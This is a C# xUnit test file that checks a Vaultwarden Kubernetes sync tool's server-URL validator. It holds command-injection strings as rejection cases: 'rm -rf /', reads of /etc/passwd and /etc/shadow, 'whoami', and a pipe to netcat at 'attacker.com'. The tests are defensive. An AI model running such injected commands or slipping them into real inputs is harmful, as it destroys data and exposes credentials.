using Xunit;
using VaultwardenK8sSync.Services;

namespace VaultwardenK8sSync.Tests.Services;

/// <summary>
/// Validates the ServerUrl scheme policy. HTTPS has always been required; with
/// an in-cluster Vaultwarden service in mind (issue #31), a plain http URL is now
/// accepted too — the operator explicitly chooses it by writing the URL with the
/// http scheme, so that URL itself is the signal that plaintext is acceptable.
/// Other schemes (ftp, file, etc.) and command-injection characters stay rejected.
/// </summary>
[Trait("Category", "Unit")]
public class VaultwardenServerUrlValidationTests
{
    [Theory]
    [InlineData("https://vault.example.com")]
    [InlineData("https://vaultwarden.vaultwarden.svc.cluster.local")]
    [InlineData("http://vault.example.com")]
    [InlineData("http://vaultwarden.vaultwarden.svc.cluster.local")]
    [InlineData("https://vault.example.com:8443/path")]
    public void IsValidServerUrl_AcceptsHttpsAndHttp(string url)
    {
        // Arrange + Act + Assert
        Assert.True(VaultwardenService.IsValidServerUrl(url),
            $"Expected '{url}' to be a valid server URL");
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("not-a-url")]
    [InlineData("../../etc/passwd")]
    [InlineData("ftp://vault.example.com")]
    [InlineData("file:///etc/shadow")]
    [InlineData("ws://vault.example.com")]
    public void IsValidServerUrl_RejectsInvalidOrUnsupported(string url)
    {
        // Arrange + Act + Assert
        Assert.False(VaultwardenService.IsValidServerUrl(url),
            $"Expected '{url}' to be rejected as an invalid server URL");
    }

    [Theory]
    [InlineData("http://evil.com; rm -rf /")]
    [InlineData("https://evil.com$(cat /etc/passwd)")]
    [InlineData("http://evil.com`whoami`")]
    [InlineData("https://evil.com&& cat /etc/shadow")]
    [InlineData("http://evil.com | nc attacker.com 1234")]
    [InlineData("https://evil.com\nrm -rf /")]
    public void IsValidServerUrl_RejectsCommandInjection_EvenWithHttpAllowed(string url)
    {
        // Arrange + Act + Assert
        // Dangerous characters are rejected regardless of the scheme, so allowing
        // http must not accidentally let command injection through.
        Assert.False(VaultwardenService.IsValidServerUrl(url),
            $"Expected '{url}' to be rejected because it contains dangerous characters");
    }
}
